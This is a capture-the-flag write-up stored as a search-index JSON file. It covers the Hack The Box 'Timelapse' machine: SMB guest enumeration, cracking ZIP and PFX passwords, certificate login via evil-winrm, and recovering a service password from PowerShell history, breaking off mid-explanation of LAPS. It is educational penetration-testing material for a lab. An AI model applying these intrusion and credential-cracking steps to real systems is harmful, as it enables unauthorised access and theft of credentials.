{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Hola","text":"<p>hola</p>"},{"location":"Machines/Easy/Time-Lapse/","title":"Time Lapse","text":""},{"location":"Machines/Easy/Time-Lapse/#timelapse-writeup","title":"TimeLapse-WriteUp","text":"<p>In this Windows Active Directory machine, we\u2019ll perform a full domain compromise starting from a guest SMB share, extracting sensitive backups, and leveraging certificate-based authentication to pivot into privileged access. You will learn how to:</p> <ul> <li>Enumerate SMB shares as guest</li> <li>Crack protected ZIP and PFX files using John the Ripper</li> <li>Extract and use .pfx certificates with OpenSSL</li> <li>Authenticate with Evil-WinRM using certificates</li> <li>Analyze PowerShell history to recover stored credentials</li> <li>Abuse LAPS (Local Administrator Password Solution) for domain escalation</li> </ul> <p>\ud83e\uddf0 Tools used: <code>smbclient</code>, <code>john</code>, <code>openssl</code>, <code>evil-winrm</code>, <code>winPEAS</code>.</p> <p>Let\u2019s get started.</p> <p>We started by scanning all TCP ports to identify exposed services. We used the following <code>nmap</code> command to detect all open TCP ports on the target. The <code>-Pn</code> flag skips host discovery (useful if ICMP is blocked), <code>-p-</code> scans all 65535 ports, and <code>-sS</code> performs a stealthy SYN scan.</p> <pre><code>sudo nmap --open -Pn -p- -sS -n -vvv 10.10.11.152\n\nStarting Nmap 7.97 ( https://nmap.org ) at 2025-09-30 14:43 -0300\n\n&lt;SNIP&gt;\n\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE          REASON\n53/tcp    open  domain           syn-ack ttl 127\n88/tcp    open  kerberos-sec     syn-ack ttl 127\n135/tcp   open  msrpc            syn-ack ttl 127\n139/tcp   open  netbios-ssn      syn-ack ttl 127\n389/tcp   open  ldap             syn-ack ttl 127\n445/tcp   open  microsoft-ds     syn-ack ttl 127\n464/tcp   open  kpasswd5         syn-ack ttl 127\n593/tcp   open  http-rpc-epmap   syn-ack ttl 127\n636/tcp   open  ldapssl          syn-ack ttl 127\n3268/tcp  open  globalcatLDAP    syn-ack ttl 127\n3269/tcp  open  globalcatLDAPssl syn-ack ttl 127\n5986/tcp  open  wsmans           syn-ack ttl 127\n9389/tcp  open  adws             syn-ack ttl 127\n49667/tcp open  unknown          syn-ack ttl 127\n49673/tcp open  unknown          syn-ack ttl 127\n49674/tcp open  unknown          syn-ack ttl 127\n49693/tcp open  unknown          syn-ack ttl 127\n49719/tcp open  unknown          syn-ack ttl 127\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 501.03 seconds\n           Raw packets sent: 196896 (8.663MB) | Rcvd: 345 (15.180KB)\n</code></pre>"},{"location":"Machines/Easy/Time-Lapse/#service-enumeration","title":"Service Enumeration:","text":"<p>After identifying open ports, we performed a targeted <code>nmap</code> scan on them using version detection and default scripts. We used <code>-sVC</code> to gather service versions and run default scripts. This helps identify running services (like Kerberos, LDAP, SMB, WinRM) and extract useful metadata from them.</p> <pre><code>sudo nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49695 10.10.11.152\nStarting Nmap 7.97 ( https://nmap.org ) at 2025-09-30 00:20 -0300\nStats: 0:01:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan\nNSE Timing: About 98.07% done; ETC: 00:21 (0:00:00 remaining)\nNmap scan report for timelapse.htb (10.10.11.152)\nHost is up (0.21s latency).\n\nPORT      STATE SERVICE           VERSION\n53/tcp    open  domain            Simple DNS Plus\n88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-09-30 11:20:07Z)\n135/tcp   open  msrpc             Microsoft Windows RPC\n139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn\n389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ldapssl?\n3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)\n3269/tcp  open  globalcatLDAPssl?\n5986/tcp  open  ssl/wsmans?\n|_ssl-date: 2025-09-30T11:22:01+00:00; +7h59m59s from scanner time.\n| ssl-cert: Subject: commonName=dc01.timelapse.htb\n| Not valid before: 2021-10-25T14:05:29\n|_Not valid after:  2022-10-25T14:25:29\n| tls-alpn:\n|_  http/1.1\n9389/tcp  open  mc-nmf            .NET Message Framing\n49667/tcp open  msrpc             Microsoft Windows RPC\n49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0\n49674/tcp open  msrpc             Microsoft Windows RPC\n49695/tcp open  msrpc             Microsoft Windows RPC\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s\n| smb2-security-mode:\n|   3.1.1:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2025-09-30T11:21:24\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 128.16 seconds\n</code></pre>"},{"location":"Machines/Easy/Time-Lapse/#smb-enumeration-with-netexec","title":"SMB Enumeration with NetExec:","text":"<p>We used NetExec (formerly CrackMapExec) to test if anonymous (null) authentication is allowed on the SMB service. This helps determine if we can access shares or perform further enumeration without credentials. We use a dummy username (a) with an empty password to test for guest or null session access. The result shows we're allowed in as Guest, meaning we can explore some shares.</p> <pre><code>nxc smb 10.10.11.152 -u 'a' -p ''\nSMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False) (Null Auth:True)\nSMB         10.10.11.152    445    DC01             [+] timelapse.htb\\a: (Guest)\n</code></pre> <p>Then we list available SMB shares: We want to see which shared folders we can access. In this case, we find a readable share named <code>Shares</code>, which might contain sensitive files or further credentials.</p> <pre><code>nxc smb 10.10.11.152 -u 'a' -p '' --shares\nSMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False) (Null Auth:True)\nSMB         10.10.11.152    445    DC01             [+] timelapse.htb\\a: (Guest)\nSMB         10.10.11.152    445    DC01             [*] Enumerated shares\nSMB         10.10.11.152    445    DC01             Share           Permissions     Remark\nSMB         10.10.11.152    445    DC01             -----           -----------     ------\nSMB         10.10.11.152    445    DC01             ADMIN$                          Remote Admin\nSMB         10.10.11.152    445    DC01             C$                              Default share\nSMB         10.10.11.152    445    DC01             IPC$            READ            Remote IPC\nSMB         10.10.11.152    445    DC01             NETLOGON                        Logon server share\nSMB         10.10.11.152    445    DC01             Shares          READ\nSMB         10.10.11.152    445    DC01             SYSVOL                          Logon server share\n</code></pre>"},{"location":"Machines/Easy/Time-Lapse/#accessing-the-shared-folder-and-downloading-a-backup","title":"Accessing the Shared Folder and Downloading a Backup","text":"<p>Once we confirmed Guest access, we connected to the <code>Shares</code> shared folder using <code>smbclient</code>. <code>smbclient</code> allows us to interact with SMB shares similarly to using an FTP client. We connect anonymously (<code>-N</code>) and list directories.</p> <pre><code>smbclient //10.10.11.152/Shares -U 'a' -I 10.10.11.152 -N\nCan't load /etc/samba/smb.conf - run testparm to debug it\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt;\n</code></pre> <p>Inside the folder <code>Dev</code>, we discovered a potentially interesting file. We identified a file named <code>winrm_backup.zip</code>. This name hints at a backup related to WinRM (Windows Remote Management), which might contain credentials. We downloaded it.</p> <pre><code>smb: \\Dev\\&gt; ls\n  .                                   D        0  Mon Oct 25 16:40:06 2021\n  ..                                  D        0  Mon Oct 25 16:40:06 2021\n  winrm_backup.zip                    A     2611  Mon Oct 25 12:46:42 2021\n\n        6367231 blocks of size 4096. 1226722 blocks available\nsmb: \\Dev\\&gt; get winrm_backup.zip\ngetting file \\Dev\\winrm_backup.zip of size 2611 as winrm_backup.zip (2.6 KiloBytes/sec) (average 2.6 KiloBytes/sec)\n</code></pre>"},{"location":"Machines/Easy/Time-Lapse/#cracking-zip-and-pfx-credentials","title":"Cracking ZIP and PFX Credentials:","text":"<p>After downloading the file <code>winrm_backup.zip</code>, we suspected it might be password-protected. To confirm this and extract the hash, we used <code>zip2john</code>, which converts encrypted ZIP archives into a format that John the Ripper can crack.</p> <pre><code>zip2john winrm_backup.zip &gt; backup.hash\nver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: 2b chk, TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683\n</code></pre> <p>Then we used John the Ripper with the popular <code>rockyou.txt</code> wordlist to crack the password:</p> <pre><code>john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt backup.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 16 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nsupremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)\n1g 0:00:00:00 DONE (2025-09-30 00:36) 6.666g/s 23156Kp/s 23156Kc/s 23156KC/s swifcat13..supergau\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n</code></pre> <p>The password was found: <code>supremelegacy</code> We used it to extract the file:</p> <pre><code>unzip winrm_backup.zip\nArchive:  winrm_backup.zip\n[winrm_backup.zip] legacyy_dev_auth.pfx password:\n  inflating: legacyy_dev_auth.pfx\n</code></pre> <p>This gave us a file named <code>legacyy_dev_auth.pfx</code>, which is a PKCS#12 certificate bundle, often used to store private keys and certificates \u2014 potentially very useful for authenticating to Windows services like WinRM.</p> <pre><code>ls -l\n.rw-r--r-- 5.0k n0name 30 Sep 00:34 \uf15b backup.hash\n.rwxr-xr-x 2.6k n0name 25 Oct  2021 \ueb11 legacyy_dev_auth.pfx\n.rw-r--r-- 2.6k n0name 30 Sep 00:33 \uf410 winrm_backup.zip\n\nfile legacyy_dev_auth.pfx\nlegacyy_dev_auth.pfx: data\n</code></pre> <p>To continue, we extracted the hash from the <code>.pfx</code> file with <code>pfx2john</code></p> <pre><code>pfx2john legacyy_dev_auth.pfx &gt; pfx.hash\n</code></pre> <p>And again used John to brute-force the password:</p> <pre><code>john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt pfx.hash\nWarning: detected hash type \"pfx\", but the string is also recognized as \"pfx-opencl\"\nUse the \"--format=pfx-opencl\" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (pfx [PKCS12 PBE (.pfx, .p12) (SHA-1 to SHA-512) 128/128 AVX 4x])\nCost 1 (iteration count) is 2000 for all loaded hashes\nCost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes\nWill run 16 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nthuglegacy       (legacyy_dev_auth.pfx)\n1g 0:00:00:29 DONE (2025-09-30 01:10) 0.03356g/s 108484p/s 108484c/s 108484C/s thumper199..thscndsp1\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n</code></pre> <p>The password was successfully cracked: <code>thuglegacy</code></p>"},{"location":"Machines/Easy/Time-Lapse/#authenticating-with-evil-winrm-using-certificate-private-key","title":"Authenticating with Evil-WinRM using Certificate &amp; Private Key","text":"<p>After extracting the <code>.pfx</code> file (<code>legacyy_dev_auth.pfx</code>) from the <code>winrm_backup.zip</code>, we suspected it might contain authentication material\u2014either for email, encryption, or remote access. In the context of Active Directory environments, <code>.pfx</code> files often store X.509 certificates and private keys, which can be used for certificate-based authentication, including over WinRM.</p> <p>Why extract the certificate and private key?</p> <p>Because WinRM (Windows Remote Management) supports authentication using certificates instead of usernames and passwords. If the <code>.pfx</code> file contains a certificate tied to a valid domain account (like <code>legacyy</code>), and that account is authorized for WinRM access, we can authenticate without needing the actual password.</p> <p>We extracted the certificate and key with:</p> <pre><code>openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacy.cert\nEnter Import Password:\nls -l\n.rw-r--r-- 5.0k n0name 30 Sep 00:34 \uf15b backup.hash\ndrwxr-xr-x    - n0name 30 Sep 00:45 \ue5ff env\ndrwxr-xr-x    - n0name 30 Sep 01:03 \ue5ff johnjumbo\n.rw------- 1.2k n0name 30 Sep 01:16 \ueafa legacy.cert\n.rw------- 3.2k n0name 30 Sep 01:12 \ueb11 legacyy_dev_auth.pem\n.rwxr-xr-x 2.6k n0name 25 Oct  2021 \ueb11 legacyy_dev_auth.pfx\n.rw-r--r-- 5.1k n0name 30 Sep 01:09 \uf15b pfx.hash\n.rw-r--r-- 2.6k n0name 30 Sep 00:33 \uf410 winrm_backup.zip\n</code></pre> <pre><code>cat legacy.cert\nBag Attributes\n    localKeyID: 01 00 00 00\nsubject=CN=Legacyy\nissuer=CN=Legacyy\n-----BEGIN CERTIFICATE-----\nMIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS\nMRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1\nMlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC\nAQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0\n0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb\nYX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z\n7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72\nMbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs\nyOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg\nMBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX\nDBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe\nrC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa\nm966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0\n3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/\nfwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG\nhqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh\nnx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA\n-----END CERTIFICATE-----\n</code></pre> <pre><code>openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacy.key\nEnter Import Password:\nEnter PEM pass phrase:\nVerifying - Enter PEM pass phrase:\nls -l\n.rw-r--r-- 5.0k n0name 30 Sep 00:34 \uf15b backup.hash\ndrwxr-xr-x    - n0name 30 Sep 00:45 \ue5ff env\ndrwxr-xr-x    - n0name 30 Sep 01:03 \ue5ff johnjumbo\n.rw------- 1.2k n0name 30 Sep 01:16 \ueafa legacy.cert\n.rw------- 2.1k n0name 30 Sep 01:17 \ueb11 legacy.key\n.rw------- 3.2k n0name 30 Sep 01:12 \ueb11 legacyy_dev_auth.pem\n.rwxr-xr-x 2.6k n0name 25 Oct  2021 \ueb11 legacyy_dev_auth.pfx\n.rw-r--r-- 5.1k n0name 30 Sep 01:09 \uf15b pfx.hash\n.rw-r--r-- 2.6k n0name 30 Sep 00:33 \uf410 winrm_backup.zip\n</code></pre> <pre><code>cat legacy.key\nBag Attributes\n    Microsoft Local Key set: &lt;No Values&gt;\n    localKeyID: 01 00 00 00\n    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b\n    Microsoft CSP Name: Microsoft Software Key Storage Provider\nKey Attributes\n    X509v3 Key Usage: 90\n-----BEGIN ENCRYPTED PRIVATE KEY-----\nMIIFNTBfBgkqhkiG9w0BBQ0wUjAxBgkqhkiG9w0BBQwwJAQQV89IqR4OLwFpw4pN\n72FvqgICCAAwDAYIKoZIhvcNAgkFADAdBglghkgBZQMEASoEEGoU0+Z5Onkn59l3\nAY3N88wEggTQ6X3YSp3nTDobnW68IheObhCbphTk78AaQa2X1i/PpMHT2UzzYAku\nIYkJtvABFTeZLKayn9rrO2p1/pXkyKC5E7gVvQetPGRnUs9ZfyJzZgtGAg/rJ5od\nDNZyO2DTReAOE5caFl7Q/7ZmvOReXi6CLzXN9Ze3l2GiqdtTjezKPQ7Cu3LKQRBr\nSb03xAeBUfc+HEzVw3vksvw8YXytnQlZfEyGf3mjtk88OWAJQ0faWoUamWGs+efh\nmoTcJqqz9/wktPZGhBgI5wp8IHYlT4mpXNZoSBU0q2cR08lAo5stbKAueBdLbz4I\nB444iC8bRvOBiCE2alT8hDs7/XEQPo9fO7QaOCz9R2FfGPJiju2BUWjsqI8E4sz1\nLcBSYxWSk1WBqHFny5u9FJvKSJqLvw/OLnb9LB2zIXXw24bBCpf29GdFKkiN5eMw\n10ljGxJxOKPJaHQ0p862kmap1B/YGkbecfy5Ox8rJa9ZUG60o0y7F2xHGP8VNtnN\n/THuy6ky25qASABdcUZ8PO9KXgUfajbPegNXErOz8ky78sdlqvr9CYnQFZNcKUBn\nXUMgsCgtj/zzx9g59gIJREfMZvtm8+DsQcjOj/H4tWqlNZr4y1lYQ6UYE3e7r3EV\nTGmBgvoRiow7PAv7G4FNiS+B5bHmdQR2yiBJJTrVk76r5tQws+YUiQj7/FxRfVK5\nq3HzY1MK6FrecBiozxveFRUn4/03fJPbkIH2QmlVKxYNJcsLHSogcwgThq3w4R52\nScur4ZeABN8kVABuyjzlkSPaEM2yXNkliGA+NhoipIR9+Kux0DOK1F4E9Iu8BCDW\n03UdHhyZrxiaq68MKvnoLOyQnAl2PrwNgsqwC2aekH03xdS6qGLyk/zpRa6oOg5H\nqtWxgR2RlYsIxL9wnGiPzt7J6kdXQPFX8N2uUVTk8/ZT97xCh7Zth8QnHt5DheQN\nAT/+c1QaFyBkfgXvv5IJxNk0sjdSKBLmFZDROariE63aANa2YSEDsJskOw+m7ppW\npQZM+9itIz97wQ9qMXeg8We5x2h7oZsdoQ9SXNOEJnGhrdC9dKRRGbnQOHR+uQbh\nKLPc8tsTG61J+5TpKnYiYJIy17weZvRDv+sEflckGjMRCeftYrrxGN1DhjSzUmkA\nnSkgCd+37I+qFDSMdW+papOLNl5sWEistMYHufcNf3Qa69fkrI5wYbIEJSXMVHls\n7jtlRv3nPz4smLV1KDcjHXDCUS6pIlIa6fy4rhqlU3LUXyLKToiZvjMCIwRViw6s\nWQC6iBWVN/2J9smqaQbt0+5YW53GyjzpI4hpY6yGYoCEWgtwYMlsKQpzSZwdT6PE\n2TdUZT4G0xwGhQpxabz7qyeI3LQU3g1+gx5YOYf4TSPOD0E2BRooIsZh4TzmqtF7\ni8dMj2ouTX39l5d1NP2FNSeHt/DzYVuP1tlS1Pf/zZ52eCKnl+TBGAwk1N5YOHfQ\nVvn8/0aSBmydLwNXAj3YFW2Ui7fE1f5VpNePTgncuDShvcMO4J0XK7gVTz3xU977\nFh36kuUJftxxNOl4lv07Yv8oO8GQIKEOHedqqb2mdcb2SSkpN5H2GnynfbiiyfI1\nZQb/msURZBTM0ir1tF5pBoQL3xgOnLk0Oblx/0c5lLC0FqRi25w1fXM=\n-----END ENCRYPTED PRIVATE KEY-----\n</code></pre> <p>The <code>.key</code> file was encrypted, so we cracked its passphrase using <code>pfx2john</code> + <code>john</code>: Password: <code>thuglegacy</code></p> <p>Once we had both components (<code>legacy.cert</code> and decrypted <code>legacy.key</code>), we attempted WinRM login using <code>evil-winrm</code></p> <pre><code>evil-winrm -S -i 10.10.11.152 -u legacyy -c legacy.cert -k legacy.key\n\nEvil-WinRM shell v3.7\n\nWarning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nWarning: SSL enabled\n\nInfo: Establishing connection to remote endpoint\nEnter PEM pass phrase:\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; \n</code></pre> <p>Evil-WinRM prompted us for the key\u2019s passphrase, and upon successful authentication, we gained an interactive shell as user <code>legacyy</code>. We confirmed access by reading the user flag:</p> <pre><code>cd ../Desktop\n*Evil-WinRM* PS C:\\Users\\legacyy\\Desktop&gt; dir\n\n\n    Directory: C:\\Users\\legacyy\\Desktop\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-ar---        9/30/2025   4:14 AM             34 user.txt\n\n\n*Evil-WinRM* PS C:\\Users\\legacyy\\Desktop&gt; type user.txt\n801aa6ed3f58b6cfc291c9592831c71b\n</code></pre>"},{"location":"Machines/Easy/Time-Lapse/#post-exploitation","title":"Post-Exploitation","text":"<p>After gaining access as <code>legacyy</code>, we proceeded with post-exploitation enumeration to identify potential privilege escalation paths. A common first step in this phase is to run automated enumeration tools like winPEAS. Why upload and run winPEAS? <code>winPEAS</code> automates the discovery of misconfigurations, stored credentials, vulnerable services, and privilege escalation vectors on Windows systems. It's particularly useful for quickly identifying low-hanging fruit that might be missed during manual enumeration.</p> <p>We uploaded the binary via <code>evil-winrm</code>:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\legacyy\\Desktop&gt; upload winPEASx64.exe\n\nInfo: Uploading /home/n0name/Documents/HTBLabs/Machines/Easy/Timelapse/winPEASx64.exe to C:\\Users\\legacyy\\Desktop\\winPEASx64.exe\nEnter PEM pass phrase:\n\nData: 13555028 bytes of 13555028 bytes copied\n\nInfo: Upload successful!\n</code></pre> <p>And executed it.</p> <pre><code>*Evil-WinRM* PS C:\\Users\\legacyy\\Desktop&gt; .\\winPEASx64.exe\nEnter PEM pass phrase:\n [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help\nANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD\nLong paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD\n\n               ((((((((((((((((((((((((((((((((\n        (((((((((((((((((((((((((((((((((((((((((((\n      ((((((((((((((**********/##########(((((((((((((\n    ((((((((((((********************/#######(((((((((((\n    ((((((((******************/@@@@@/****######((((((((((\n    ((((((********************@@@@@@@@@@/***,####((((((((((\n    (((((********************/@@@@@%@@@@/********##(((((((((\n    (((############*********/%@@@@@@@@@/************((((((((\n    ((##################(/******/@@@@@/***************((((((\n    ((#########################(/**********************(((((\n    ((##############################(/*****************(((((\n    ((###################################(/************(((((\n    ((#######################################(*********(((((\n    ((#######(,.***.,(###################(..***.*******(((((\n    ((#######*(#####((##################((######/(*****(((((\n    ((###################(/***********(##############()(((((\n    (((#####################/*******(################)((((((\n    ((((############################################)((((((\n    (((((##########################################)(((((((\n    ((((((########################################)(((((((\n    ((((((((####################################)((((((((\n    (((((((((#################################)(((((((((\n        ((((((((((##########################)(((((((((\n              ((((((((((((((((((((((((((((((((((((((\n                 ((((((((((((((((((((((((((((((\n\nADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.\n\n  WinPEAS-ng by @hacktricks_live\n\n       /---------------------------------------------------------------------------------\\\n       |                             Do you like PEASS?                                  |\n       |---------------------------------------------------------------------------------|\n       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |\n       |         Follow on Twitter         :     @hacktricks_live                        |\n       |         Respect on HTB            :     SirBroccoli                             |\n       |---------------------------------------------------------------------------------|\n       |                                 Thank you!                                      |\n       \\---------------------------------------------------------------------------------/\n\n  [+] Legend:\n         Red                Indicates a special privilege over an object or something is misconfigured\n         Green              Indicates that some protection is enabled or something is well configured\n         Cyan               Indicates active users\n         Blue               Indicates disabled users\n         LightYellow        Indicates links\n</code></pre> <p>Among other findings, it highlighted that PowerShell command history was available:</p> <pre><code>&lt;SNIP&gt;\n\u00c9\u00cd\u00cd\u00cd\u00cd\u00cd\u00cd\u00cd\u00cd\u00cd\u00cd\u00b9 PowerShell Settings\n    PowerShell v2 Version: 2.0\n    PowerShell v5 Version: 5.1.17763.1\n    PowerShell Core Version:\n    Transcription Settings:\n    Module Logging Settings:\n    Scriptblock Logging Settings:\n    PS history file: C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n    PS history size: 434B\n&lt;SNIP&gt;\n</code></pre> <p>This file often stores the last commands executed in a PowerShell session\u2014sometimes including passwords or sensitive operations. We read the contents:</p> <pre><code>C:\\Users\\legacyy\\Desktop&gt; type C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\nEnter PEM pass phrase:\nwhoami\nipconfig /all\nnetstat -ano |select-string LIST\n$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck\n$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force\n$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)\ninvoke-command -computername localhost -credential $c -port 5986 -usessl -\nSessionOption $so -scriptblock {whoami}\nget-aduser -filter * -properties *\nexit\n</code></pre> <p>Inside, we found a hardcoded password used to create a <code>PSCredential</code> object for user <code>svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV</code></p> <p>To connect using <code>evil-winrm</code>, we used: <code>evil-winrm -S -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'</code> The <code>-S</code> flag forces the use of SSL (HTTPS) on port 5986, which is required when WinRM is configured for secure communication only. Without <code>-S</code>, <code>evil-winrm</code> attempts a connection over HTTP (port 5985), which would fail if the server requires SSL.</p> <pre><code>evil-winrm -S -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'\n\nEvil-WinRM shell v3.7\n\nWarning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nWarning: SSL enabled\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents&gt;\n</code></pre> <p>Once connected, we confirmed access:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents&gt; whoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name            SID\n==================== ============================================\ntimelapse\\svc_deploy S-1-5-21-671920749-559770252-3318990721-3103\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                  Type             SID                                          Attributes\n=========================================== ================ ============================================ ==================================================\nEveryone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group\nTIMELAPSE\\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Plus Mandatory Level Label            S-1-16-8448\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n\n\nUSER CLAIMS INFORMATION\n-----------------------\n\nUser claims unknown.\n\nKerberos support for Dynamic Access Control on this device has been disabled.\n</code></pre> <p>Among the groups, we found something interesting <code>TIMELAPSE\\LAPS_Readers</code></p>"},{"location":"Machines/Easy/Time-Lapse/#what-is-laps_readers","title":"What is <code>LAPS_Readers</code>?","text":"<p><code>LAPS_Readers</code> is a custom Active Directory group that has read access to LAPS-managed passwords.</p>"},{"location":"Machines/Easy/Time-Lapse/#what-is-laps","title":"What is LAPS?","text":"<p>LAPS (Local Administrator Password Solution) is a Microsoft feature that:</p> <ul> <li>Randomly generates a unique local administrator password for each computer.</li> <li>Stores the password in an AD attribute: <code>ms-Mcs-AdmPwd</code>.</li> <li>Automatically rotates it based on expiration policies.</li> 